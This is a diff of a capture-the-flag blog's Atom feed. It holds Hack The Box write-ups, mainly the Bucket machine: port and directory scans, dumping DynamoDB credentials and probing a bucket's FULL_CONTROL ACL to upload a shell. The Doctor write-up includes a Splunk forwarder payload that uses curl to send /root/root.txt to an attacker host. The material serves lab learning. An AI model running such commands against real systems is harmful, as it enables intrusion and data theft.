@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2021-04-18T22:25:34+02:00</updated><id>/feed.xml</id><title type="html">The Cyber Experiment</title><subtitle>This website serves as learning tool. This website contains blog like posts that describe the usage of various tools and writeups for CTFs and any other topic that I played with.</subtitle><entry><title type="html">Laboratory Write-Up</title><link href="/htb/laboratory" rel="alternate" type="text/html" title="Laboratory Write-Up" /><published>2021-04-16T23:44:00+02:00</published><updated>2021-04-16T23:44:00+02:00</updated><id>/htb/laboratory</id><content type="html" xml:base="/htb/laboratory">&lt;p&gt;This is my writeup of the laboratory machine on Hack The Box. Eventhough the box was rated easy, I found getting a foothold quite hard. I exploited 2 GitLab vulnerabilties to gain a foothold. Leveraging the foothold; I get access to the GitLab admin account that contained a private SSH key. Using the SSH key I get access to the machine and gain root privileges by exploit a SUID binary that uses relative paths. Overall a fun machine that shows how dangerous LFI can be when chained with deserialization.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2021-04-24T17:58:35+02:00</updated><id>/feed.xml</id><title type="html">The Cyber Experiment</title><subtitle>This website serves as learning tool. This website contains blog like posts that describe the usage of various tools and writeups for CTFs and any other topic that I played with.</subtitle><entry><title type="html">Laboratory Write-Up</title><link href="/htb/laboratory" rel="alternate" type="text/html" title="Laboratory Write-Up" /><published>2021-04-16T23:44:00+02:00</published><updated>2021-04-16T23:44:00+02:00</updated><id>/htb/laboratory</id><content type="html" xml:base="/htb/laboratory">&lt;p&gt;This is my writeup of the laboratory machine on Hack The Box. Eventhough the box was rated easy, I found getting a foothold quite hard. I exploited 2 GitLab vulnerabilties to gain a foothold. Leveraging the foothold; I get access to the GitLab admin account that contained a private SSH key. Using the SSH key I get access to the machine and gain root privileges by exploit a SUID binary that uses relative paths. Overall a fun machine that shows how dangerous LFI can be when chained with deserialization.&lt;/p&gt;
 
 &lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;
 
@@ -192,4 +192,277 @@ shaun     871436  0.0  0.0  17668   724 pts/6    S+   00:23   0:00 &lt;span clas
         &lt;span class=&quot;nt&quot;&gt;--payload&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;curl -F 'data=@/root/root.txt' http://YOUR_IP:8000&quot;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
         &lt;span class=&quot;nt&quot;&gt;--lhost&lt;/span&gt; YOUR_IP
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;em&gt;Running the PySplunkWhisperer2 tool to obtain the root flag.&lt;/em&gt;&lt;/p&gt;</content><author><name></name></author><category term="htb" /><summary type="html">This is my writeup of the Doctor machine on Hack The Box. It was a fun box that introduced me to the concept of Server Side Template Injection. The machine has a SSTI vulnerabilty which allows an attacker to gain a foothold on the machine as the web user. In the Apache logs I found a credential that I then used to escalate privileges by abusing built-in functionality of the Splunk Forwarder, which allows arbitrary code execution and is running as the root user.</summary></entry></feed>
+&lt;p&gt;&lt;em&gt;Running the PySplunkWhisperer2 tool to obtain the root flag.&lt;/em&gt;&lt;/p&gt;</content><author><name></name></author><category term="htb" /><summary type="html">This is my writeup of the Doctor machine on Hack The Box. It was a fun box that introduced me to the concept of Server Side Template Injection. The machine has a SSTI vulnerabilty which allows an attacker to gain a foothold on the machine as the web user. In the Apache logs I found a credential that I then used to escalate privileges by abusing built-in functionality of the Splunk Forwarder, which allows arbitrary code execution and is running as the root user.</summary></entry><entry><title type="html">Bucket Write-Up</title><link href="/htb/bucket-write-up" rel="alternate" type="text/html" title="Bucket Write-Up" /><published>2021-03-23T22:20:00+01:00</published><updated>2021-03-23T22:20:00+01:00</updated><id>/htb/bucket-write-up</id><content type="html" xml:base="/htb/bucket-write-up">&lt;p&gt;This is my writeup of the Bucket machine on Hack The Box. It was a fun box that introduced me to AWS S3 buckets and DynamoDB. The machine uses an S3 bucket with too wide permissions which allows an attacker to gain foothold on the machine as the www-data user by uploading a shell. Once on the machine, enumeration reveals another instance of Apache running as the root user. This Apache instance runs a web application that can be leveraged for arbitrary local file read; resulting in disclosure of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt; flag.&lt;/p&gt;
+
+&lt;h2 id=&quot;scanning--enumeration&quot;&gt;Scanning &amp;amp; Enumeration&lt;/h2&gt;
+&lt;p&gt;Initial scan of the host shows that port 80 is open and that the hostname of the machine is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bucket.htb&lt;/code&gt;. So I add an entry to our /etc/hosts file for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.10.212   bucket.htb&lt;/code&gt; and proceed to enumerate the discovered web application.&lt;/p&gt;
+
+&lt;p&gt;In the background I also ran a tcp scan on all ports, however this scan did not return any other open ports.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; nmap/tcp-version 10.10.10.212
+
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.212
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.027s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Did not follow redirect to http://bucket.htb/
+Service Info: Host: 127.0.1.1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;enumerating-the-web-application&quot;&gt;Enumerating the Web Application&lt;/h2&gt;
+&lt;p&gt;Browsing around on the web application does not reveal any dynamic content or parameter that might be injectable. But we do discover that the website hosts its images on a sub domain: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s3.bucket.htb&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;I decided to enumerate the main website and the sub domain by looking for hidden content. Running dirb on the main domain I found no interesting results (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dirb http://bucket.htb /opt/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt&lt;/code&gt;). &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dirb&lt;/code&gt; took extremely long so I used the tool &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; on the sub domain and found some hidden content.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://s3.bucket.htb/FUZZ &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /opt/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+      | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 404 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+      | &lt;span class=&quot;nb&quot;&gt;tee &lt;/span&gt;raft-small-words-s3.wfuzz
+
+&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Wfuzz 3.1.0 - The Web Fuzzer                         &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
+
+Target: http://s3.bucket.htb/FUZZ
+Total requests: 38267
+
+&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
+ID           Response   Lines    Word       Chars       Payload                                 
+&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
+
+000001187:   200        0 L      5 W        54 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;health&quot;&lt;/span&gt;                                
+000001382:   200        0 L      0 W        0 Ch        &lt;span class=&quot;s2&quot;&gt;&quot;shell&quot;&lt;/span&gt;                                 
+000004191:   403        9 L      28 W       278 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;server-status&quot;&lt;/span&gt;                         
+000028680:   500        0 L      13 W       158 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;shells&quot;&lt;/span&gt;                                
+
+Total &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 0
+Processed Requests: 38267
+Filtered Requests: 0
+Requests/sec.: 0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;dynamodb&quot;&gt;DynamoDB&lt;/h2&gt;
+&lt;p&gt;The page &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://s3.bucket.htb/shell/&lt;/code&gt; (mind the last slash, without it it will not show the right page) hosts a DynamoDB shell. As I am not familiar at all with DynamoDB, however any database may contain interesting data. The menu on the page itself had an examples section. Using the found examples I listed the tables and dumped an interesting table to obtain the following credentials&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Username&lt;/th&gt;
+      &lt;th&gt;Password&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Mgmt&lt;/td&gt;
+      &lt;td&gt;Mangement@#1@#&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Cloudadm&lt;/td&gt;
+      &lt;td&gt;Welcome123!&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Sysadm&lt;/td&gt;
+      &lt;td&gt;n2vM-&amp;lt;_K_Q:.Aa2 }&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;First thing I tried was see if any of the credentials worked for SSH, however I had no luck here. So lets continue our enumeration.&lt;/p&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;params&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;ExclusiveStartTableName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;table_name&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;dynamodb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;listTables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ppJson&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ppJson&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
+&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;em&gt;Javascript snippet used to list the tables in DynamoDB.&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;params&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;TableName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Select&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ALL_ATTRIBUTES&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;dynamodb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;scan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ppJson&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ppJson&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
+&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;em&gt;Javascript snippet used to dump the contents of the users table.&lt;/em&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;interacting-with-the-api&quot;&gt;Interacting with the API&lt;/h2&gt;
+&lt;p&gt;By visiting the http://s3.bucket.htb/server-status page, I discover that the server is running an S3 instance (what a surprise…). As I am not familiar with AWS S3 I looked up the &lt;a href=&quot;https://docs.aws.amazon.com/AmazonS3/latest/API/API_Operations_Amazon_Simple_Storage_Service.html&quot;&gt;documentation&lt;/a&gt; first to figure out how I could enumerate the bucket.&lt;/p&gt;
+
+&lt;p&gt;From the documentation I learn that I can enumerate the bucket by querying its API. The first query that made sense to me was to obtain its ACL, by going to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://s3.bucket.htb/adserver/?acl&lt;/code&gt;. The ACL states that we have FULL_CONTROL permissions on the bucket. At this stage it was not yet clear how I could leverage this to gain a foothold on the machine. So I continue my enumeration&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;AccessControlPolicy&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;Owner&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;ID&amp;gt;&lt;/span&gt;
+      75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/ID&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;DisplayName&amp;gt;&lt;/span&gt;webfile&lt;span class=&quot;nt&quot;&gt;&amp;lt;/DisplayName&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Owner&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;AccessControlList&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;Grant&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;Grantee&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xsi:type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CanonicalUser&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;ID&amp;gt;&lt;/span&gt;
+          75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/ID&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Grantee&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;Permission&amp;gt;&lt;/span&gt;FULL_CONTROL&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Permission&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Grant&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/AccessControlList&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/AccessControlPolicy&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;em&gt;The access control policy of the adserver bucket.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;The next step is to obtain the contents of the bucket by visiting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://s3.bucket.htb/adserver/?inventory&lt;/code&gt;. In the output we see that the bucket contains the source code of the web application. At this point it seems that the bucket either host the web application or the web server retrieves the web application from the bucket. In any case, I proceed to investigate how I can upload a shell to the web server (remember that we have FULL_CONTROL permissions)&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;ListBucketResult&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://s3.amazonaws.com/doc/2006-03-01/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;Name&amp;gt;&lt;/span&gt;adserver&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Name&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;MaxKeys&amp;gt;&lt;/span&gt;1000&lt;span class=&quot;nt&quot;&gt;&amp;lt;/MaxKeys&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;Delimiter&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;IsTruncated&amp;gt;&lt;/span&gt;false&lt;span class=&quot;nt&quot;&gt;&amp;lt;/IsTruncated&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;Contents&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;Key&amp;gt;&lt;/span&gt;images/bug.jpg&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Key&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;LastModified&amp;gt;&lt;/span&gt;2021-03-26T20:45:04.000Z&lt;span class=&quot;nt&quot;&gt;&amp;lt;/LastModified&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;ETag&amp;gt;&lt;/span&gt;&quot;25118cbb11c412f4b517249e6e877dc3&quot;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/ETag&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;Size&amp;gt;&lt;/span&gt;37840&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Size&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;StorageClass&amp;gt;&lt;/span&gt;STANDARD&lt;span class=&quot;nt&quot;&gt;&amp;lt;/StorageClass&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;Owner&amp;gt;&lt;/span&gt;
+         &lt;span class=&quot;nt&quot;&gt;&amp;lt;ID&amp;gt;&lt;/span&gt;75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a&lt;span class=&quot;nt&quot;&gt;&amp;lt;/ID&amp;gt;&lt;/span&gt;
+         &lt;span class=&quot;nt&quot;&gt;&amp;lt;DisplayName&amp;gt;&lt;/span&gt;webfile&lt;span class=&quot;nt&quot;&gt;&amp;lt;/DisplayName&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Owner&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Contents&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;Contents&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;Key&amp;gt;&lt;/span&gt;images/cloud.png&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Key&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;LastModified&amp;gt;&lt;/span&gt;2021-03-26T20:45:04.000Z&lt;span class=&quot;nt&quot;&gt;&amp;lt;/LastModified&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;ETag&amp;gt;&lt;/span&gt;&quot;4d7905acad5d78b01085e461f78eae43&quot;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/ETag&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;Size&amp;gt;&lt;/span&gt;51485&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Size&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;StorageClass&amp;gt;&lt;/span&gt;STANDARD&lt;span class=&quot;nt&quot;&gt;&amp;lt;/StorageClass&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;Owner&amp;gt;&lt;/span&gt;
+         &lt;span class=&quot;nt&quot;&gt;&amp;lt;ID&amp;gt;&lt;/span&gt;75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a&lt;span class=&quot;nt&quot;&gt;&amp;lt;/ID&amp;gt;&lt;/span&gt;
+         &lt;span class=&quot;nt&quot;&gt;&amp;lt;DisplayName&amp;gt;&lt;/span&gt;webfile&lt;span class=&quot;nt&quot;&gt;&amp;lt;/DisplayName&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Owner&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Contents&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;nt&quot;&gt;&amp;lt;Contents&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;Key&amp;gt;&lt;/span&gt;images/malware.png&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Key&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;LastModified&amp;gt;&lt;/span&gt;2021-03-26T20:45:04.000Z&lt;span class=&quot;nt&quot;&gt;&amp;lt;/LastModified&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;ETag&amp;gt;&lt;/span&gt;&quot;b22715647e087104f6b1ff7c0ce0731c&quot;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/ETag&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;Size&amp;gt;&lt;/span&gt;16486&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Size&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;StorageClass&amp;gt;&lt;/span&gt;STANDARD&lt;span class=&quot;nt&quot;&gt;&amp;lt;/StorageClass&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;Owner&amp;gt;&lt;/span&gt;
+         &lt;span class=&quot;nt&quot;&gt;&amp;lt;ID&amp;gt;&lt;/span&gt;75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a&lt;span class=&quot;nt&quot;&gt;&amp;lt;/ID&amp;gt;&lt;/span&gt;
+         &lt;span class=&quot;nt&quot;&gt;&amp;lt;DisplayName&amp;gt;&lt;/span&gt;webfile&lt;span class=&quot;nt&quot;&gt;&amp;lt;/DisplayName&amp;gt;&lt;/span&gt;
